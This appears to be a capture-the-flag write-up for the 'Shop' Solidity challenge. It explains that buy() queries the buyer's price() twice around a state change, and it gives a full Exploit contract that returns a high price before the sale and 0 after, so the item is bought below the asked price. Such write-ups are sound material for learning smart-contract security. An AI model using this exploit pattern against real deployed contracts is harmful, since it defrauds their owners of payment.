#SHOP

##Objective:
Buy the product for less than the price asked.

analysis:
The buy() function calls price() twice on the Buyer interface

The price() function is expected to be a view function 
The isSold state variable is updated between the two calls to price().

solution : 
 return a high price when isSold is false 
 and vice versa.

```
pragma solidity ^0.6.0;
interface Buyer {
    function price() external view returns (uint);
}
interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}
contract Exploit is Buyer {
    IShop public shop;
    constructor(address _shopAddress) public {
        shop = IShop(_shopAddress);
    }
    function price() external view override returns (uint) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }

    function attack() public {
        shop.buy();
    }
}
```

The price() function checks the isSold status of the Shop contract.
After isSold is set to true, it returns 0, effectively reducing the price.
